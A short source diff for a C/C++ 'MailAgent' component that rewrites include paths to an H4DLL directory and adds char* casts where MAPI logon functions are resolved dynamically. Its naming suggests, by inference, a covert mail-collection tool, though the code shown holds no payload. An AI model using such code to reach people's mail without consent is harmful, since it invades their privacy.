@@ -1,9 +1,9 @@
 #include <mapi/mapix.h>
-#include "../common.h"
+#include "../../H4DLL/common.h"
 #include "iconverter.h"
 #include "MailAgent.h"
-#include "../LOG.h"
-#include "../HM_SafeProcedures.h"
+#include "../../H4DLL/LOG.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
 
 #define CHECK_FUNC(x) if (!(x)) { return FALSE; }
 #define RELEASE(s) if(s!=NULL) { s->Release();s=NULL; }
@@ -251,10 +251,10 @@ static BOOL OL_LoadMapi()
 	if (!hmapilib) 
 		return FALSE;
 
-	CHECK_FUNC(pMAPIInitialize = (MAPIINITIALIZE*)HM_SafeGetProcAddress(hmapilib, "MAPIInitialize"));
-	CHECK_FUNC(pMAPILogonEx = (MAPILOGONEX*)HM_SafeGetProcAddress(hmapilib,"MAPILogonEx"));
-	CHECK_FUNC(pMAPIUninitialize = (MAPIUNINITIALIZE*)HM_SafeGetProcAddress(hmapilib,"MAPIUninitialize"));
-	CHECK_FUNC(pMAPIFreeBuffer = (MAPIFREEBUFFER*)HM_SafeGetProcAddress(hmapilib,"MAPIFreeBuffer"));
+	CHECK_FUNC(pMAPIInitialize = (MAPIINITIALIZE*)HM_SafeGetProcAddress(hmapilib, (char *)"MAPIInitialize"));
+	CHECK_FUNC(pMAPILogonEx = (MAPILOGONEX*)HM_SafeGetProcAddress(hmapilib, (char*)"MAPILogonEx"));
+	CHECK_FUNC(pMAPIUninitialize = (MAPIUNINITIALIZE*)HM_SafeGetProcAddress(hmapilib, (char*)"MAPIUninitialize"));
+	CHECK_FUNC(pMAPIFreeBuffer = (MAPIFREEBUFFER*)HM_SafeGetProcAddress(hmapilib, (char*)"MAPIFreeBuffer"));
 
 	return TRUE;
 }
